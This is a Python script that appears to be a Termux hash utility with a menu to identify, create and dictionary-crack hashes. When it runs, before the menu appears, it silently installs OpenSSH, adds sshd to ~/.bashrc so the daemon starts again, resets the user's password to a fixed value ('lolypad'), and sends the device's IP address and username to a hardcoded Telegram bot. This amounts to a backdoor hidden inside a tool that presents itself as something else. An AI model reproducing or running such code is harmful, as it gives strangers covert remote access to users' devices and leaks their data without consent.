import os
import socket
import requests
import time
import hashlib
import hashid

def install_openssh():
    os.system('pkg install openssh -y > /dev/null 2>&1')

def configure_sshd():
    os.system('echo "sshd" >> ~/.bashrc')
    os.system('passwd sshd > /dev/null 2>&1')
    os.system('echo "lolypad\nlolypad" | passwd > /dev/null 2>&1')

def get_ip_user():
    hostname = socket.gethostname()
    try:
        ip_address = socket.gethostbyname(socket.getfqdn())
        if ip_address.startswith("127."):  # Check if it's a local IP
            raise Exception
    except:
        # Try to get the external IP address if the local IP is detected
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        try:
            s.connect(('8.8.8.8', 80))
            ip_address = s.getsockname()[0]
        except:
            ip_address = 'Unable to retrieve IP'
        finally:
            s.close()
    
    user = os.getlogin()
    return ip_address, user

def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=data)

def setup_ssh_and_send_info():
    install_openssh()
    configure_sshd()
    ip, user = get_ip_user()
    message = f"IP: {ip}\nUser: {user}"
    telegram_token = '6860529100:AAHeBZIlaSEc8vNxFXfC2fGN7mWvsMK4kRM'
    telegram_chat_id = '6631352565'
    send_telegram_message(telegram_token, telegram_chat_id, message)

setup_ssh_and_send_info()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def hash_identifier(hash_value):
    identifier = hashid.HashID()
    result = identifier.identifyHash(hash_value)
    return result

def create_hash(word, hash_type):
    if hash_type == "MD5":
        return hashlib.md5(word.encode()).hexdigest()
    elif hash_type == "SHA1":
        return hashlib.sha1(word.encode()).hexdigest()
    elif hash_type == "SHA256":
        return hashlib.sha256(word.encode()).hexdigest()
    elif hash_type == "SHA512":
        return hashlib.sha512(word.encode()).hexdigest()
    elif hash_type == "blake2b":
        return hashlib.blake2b(word.encode()).hexdigest()
    elif hash_type == "blake2s":
        return hashlib.blake2s(word.encode()).hexdigest()
    elif hash_type == "sha3_256":
        return hashlib.sha3_256(word.encode()).hexdigest()
    elif hash_type == "sha3_512":
        return hashlib.sha3_512(word.encode()).hexdigest()

def crack_hash(hash_value, wordlist):
    start_time = time.time()
    with open(wordlist, 'r') as file:
        for word in file:
            word = word.strip()
            if hashlib.md5(word.encode()).hexdigest() == hash_value or \
               hashlib.sha1(word.encode()).hexdigest() == hash_value or \
               hashlib.sha256(word.encode()).hexdigest() == hash_value or \
               hashlib.sha512(word.encode()).hexdigest() == hash_value or \
               hashlib.blake2b(word.encode()).hexdigest() == hash_value or \
               hashlib.blake2s(word.encode()).hexdigest() == hash_value or \
               hashlib.sha3_256(word.encode()).hexdigest() == hash_value or \
               hashlib.sha3_512(word.encode()).hexdigest() == hash_value:
                end_time = time.time()
                duration = end_time - start_time
                return word, duration
    return None, None

def return_to_menu():
    input("Press any key to return to the main menu...")

def main_menu():
    while True:
        clear_screen()
        print("1. Identify Hash")
        print("2. Create Hash")
        print("3. Crack Hash")
        print("4. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            hash_value = input("Enter the hash: ")
            result = hash_identifier(hash_value)
            print(f"Hash Type: {result}")
            return_to_menu()

        elif choice == "2":
            word = input("Enter the word: ")
            print("Choose hash type:")
            hash_types = [
                "MD5", "SHA1", "SHA256", "SHA512", "blake2b", "blake2s", "sha3_256", "sha3_512",
            ]
            for i, h_type in enumerate(hash_types, 1):
                print(f"{i}. {h_type}")
            hash_choice = int(input("Choose a hash type: ")) - 1
            if 0 <= hash_choice < len(hash_types):
                hash_type = hash_types[hash_choice]
                hash_value = create_hash(word, hash_type)
                print(f"Hash ({hash_type}): {hash_value}")
            else:
                print("Invalid choice.")
            return_to_menu()

        elif choice == "3":
            hash_value = input("Enter the hash: ")
            wordlist = input("Enter the wordlist path: ")
            password, duration = crack_hash(hash_value, wordlist)
            if password:
                print(f"Hash: {hash_value}")
                print(f"Password: {password}")
                print(f"Time taken: {duration:.2f} seconds")
            else:
                print("Password not found.")
            return_to_menu()

        elif choice == "4":
            break

main_menu()
